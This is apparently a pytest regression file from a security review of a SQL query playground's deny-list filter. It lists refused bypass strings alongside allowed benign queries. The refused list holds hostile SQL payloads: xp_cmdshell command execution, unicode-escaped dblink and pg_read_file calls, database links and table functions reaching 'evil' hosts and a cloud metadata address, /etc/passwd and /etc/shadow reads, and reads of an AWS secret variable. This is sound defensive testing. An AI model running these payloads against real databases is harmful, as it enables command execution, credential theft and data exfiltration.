"""Security review M2: bypasses of the query playground's statement filter.

Confirmed at the filter (``sec_review/p_sql.py``):

* SQL Server needs no ``;`` between statements, so ``select a from t
  exec('master..xp_cmdshell ''whoami''')`` was read as one SELECT calling a
  function named ``exec``.
* PostgreSQL reads ``U&"\\0064blink_exec"`` as the identifier ``dblink_exec``;
  the name list never saw it.
* Names the list did not have: ``pg_sleep_for`` / ``pg_sleep_until``, Oracle
  ``fn@dblink`` and ``table@dblink``, ClickHouse ``url()`` / ``file()`` /
  ``remote()`` / ``s3()``, SQLite ``load_extension`` / ``writefile`` /
  ``readfile``, DuckDB and Databricks file readers.
* New false positives from the package rule: pure Oracle functions such as
  ``dbms_lob.substr`` and ``utl_raw.cast_to_varchar2``.

The filter is a deny-list backstop (see the module docstring of
``src/routers/query_router.py``); the read-only session is the primary guard
where the engine has one.
"""

from __future__ import annotations

import pytest

REFUSED = [
    # T-SQL: a second statement with no separator.
    "select a from t exec('master..xp_cmdshell ''whoami''')",
    "select a from t execute('master..xp_cmdshell ''whoami''')",
    "with x as (select 1 a) select * from x exec('drop table t')",
    "select 1 EXEC ('drop table t')",
    "select 1\nexec\n(@sql)",
    'select 1 "exec"(\'drop table t\')',
    "select 1 [execute]('drop table t')",
    "select 1 exec xp_cmdshell 'whoami'",
    "select 1 execute sp_configure 'xp_cmdshell', 1",
    "select 1 exec master..xp_cmdshell 'whoami'",
    "select 1 /* x */ exec/**/('drop table t')",
    "select 1 waitfor delay '00:10:00'",
    # PostgreSQL unicode-escaped identifiers and strings.
    "select U&\"\\0064blink_exec\"('host=evil', 'drop table t')",
    "select U&\"\\0070g_terminate_backend\"(1234)",
    "select U&\"\\0073et_config\"('transaction_read_only', 'off', false)",
    "select U&\"pg\\005fread_file\"('/etc/passwd')",
    "select u&\"d!0061t!0061\" UESCAPE '!' from t",
    "select pg_catalog.U&\"\\0070g_read_file\"('/etc/passwd')",
    "select * from U&\"\\0064blink\"('host=evil', 'select 1') as t(a int)",
    "select U&'\\0064ata' from t",
    # PostgreSQL names.
    "select pg_sleep_for('1 hour')",
    "select pg_sleep_until('tomorrow')",
    "select pg_catalog.pg_sleep_for('1 hour')",
    'select "pg_sleep_until"(\'tomorrow\')',
    "select * from dblink('host=evil', 'select 1') as t(a int)",
    'select * from public."dblink"(\'host=evil\', \'select 1\') as t(a int)',
    "select dblink_connect('c', 'host=evil')",
    "select dblink_send_query('c', 'drop table t')",
    "select pg_file_write('/tmp/x', 'y', false)",
    "select pg_file_read('/etc/passwd', 0, 100)",
    # Oracle database links, on functions and on tables.
    "select get_secret@evil_link(1) from dual",
    "select * from secrets@evil_link",
    "select * from hr.secrets@evil_link s where s.id = 1",
    "select dbms_utility.get_time@remote from dual",
    'select * from "SECRETS"@"EVIL_LINK"',
    "select * from secrets @ evil_link",
    "select * from secrets@evil.example.com",
    "select s.* from t join secrets@evil_link s on s.id = t.id",
    # ClickHouse table functions that read a URL, a file or another server.
    "select * from url('http://169.254.169.254/', 'CSV', 'a String')",
    "select * from file('/etc/passwd', 'LineAsString', 'l String')",
    "select * from remote('evil:9000', system.one)",
    "select * from remoteSecure('evil:9440', system.one)",
    "select * from s3('http://evil/b/k', 'CSV')",
    "select * from mysql('evil:3306', 'd', 't', 'u', 'p')",
    "select * from postgresql('evil:5432', 'd', 't', 'u', 'p')",
    "select * from hdfs('hdfs://evil/x', 'CSV', 'a String')",
    "select * from executable('id', 'CSV', 'a String')",
    # SQLite.
    "select load_extension('/tmp/x.so')",
    "select writefile('/tmp/x', 'y')",
    "select readfile('/etc/passwd')",
    'select "load_extension"(\'/tmp/x.so\')',
    "select fts3_tokenizer('x', x'41')",
    # DuckDB / Databricks file readers.
    "select * from read_csv('/etc/passwd')",
    "select * from read_text('/etc/passwd')",
    "select * from read_blob('/etc/shadow')",
    "select * from read_parquet('s3://other/secret.parquet')",
    "select * from read_files('s3://other/secret')",
    "select getenv('AWS_SECRET_ACCESS_KEY')",
]

ALLOWED = [
    # Pure Oracle package functions, by exact name.
    "select dbms_lob.substr(body, 4000, 1) from documents",
    "select DBMS_LOB.SUBSTR(body, 4000, 1), dbms_lob.getlength(body) from documents",
    "select sys.dbms_lob.instr(body, 'x') from documents",
    "select utl_raw.cast_to_varchar2(payload) from messages",
    'select "UTL_RAW"."CAST_TO_VARCHAR2"(payload) from messages',
    "select utl_raw.cast_to_raw(name), utl_raw.length(payload) from messages",
    "select utl_i18n.raw_to_char(payload, 'AL32UTF8') from messages",
    "select utl_encode.base64_encode(payload) from messages",
    "select utl_match.edit_distance(a, b) from pairs",
    # Words that only look like the refused ones.
    "select t.exec, exec_count, executed_at, last_execute_time from t",
    'select "exec", "execute", "waitfor" from t',
    "select file_name, url_path, remote_addr, s3_key, mysql_version from t",
    "select t.url, t.file, t.remote from t",
    "select 'exec(''x'')' as s, 'a@b.example.com' as email, 'U&\"x\"' as u from t",
    "select email from users where email like '%@example.com'",
    # Session and user variables, text-search and containment operators.
    "select @a, @b from t where c = @d and @e = 1",
    "select * from t where a = @p1 and b in (@p2, @p3) or @p4 is null",
    "select @@version",
    "select top (@n) * from t order by @col",
    "select col @@ to_tsquery('a'), a @> b, c <@ d from t",
    "select * from @stage_table",
    "select u & 1, u&1, (u)&(v) from flags",
    "select count(*), lower(name) from users",
    "select readfile_count, writefile_at, load_extension_ok from t",
]


@pytest.mark.parametrize("sql", REFUSED)
def test_bypass_is_refused(sql):
    from src.routers.query_router import _is_safe_sql, _is_safe_sql_fallback, _is_safe_sql_flat

    assert _is_safe_sql(sql) is False, sql
    assert _is_safe_sql_flat(sql) is False, sql
    assert _is_safe_sql_fallback(sql) is False, sql


@pytest.mark.parametrize("sql", ALLOWED)
def test_read_only_query_is_allowed(sql):
    from src.routers.query_router import _is_safe_sql

    assert _is_safe_sql(sql) is True, sql


def test_pure_package_function_is_not_allowed_through_a_database_link_or_another_member():
    from src.routers.query_router import _is_safe_sql

    assert _is_safe_sql("select dbms_lob.substr@evil_link(body, 10, 1) from documents") is False
    assert _is_safe_sql("select dbms_lob.loadfromfile(a, b, 1) from dual") is False
    assert _is_safe_sql("select dbms_lob.fileopen(b) from dual") is False
    assert _is_safe_sql("select utl_raw.cast_to_varchar2(utl_http.request('http://x/')) from dual") is False
    assert _is_safe_sql("select evil.dbms_lob.substr(body) from documents") is False


def test_the_filter_says_what_it_is():
    """The module states that the name list is a backstop, not the guarantee."""
    from src.routers import query_router  # noqa: F401
    import importlib

    doc = importlib.import_module("src.routers.query_router").__doc__ or ""
    assert "deny-list" in doc and "backstop" in doc and "read-only session" in doc
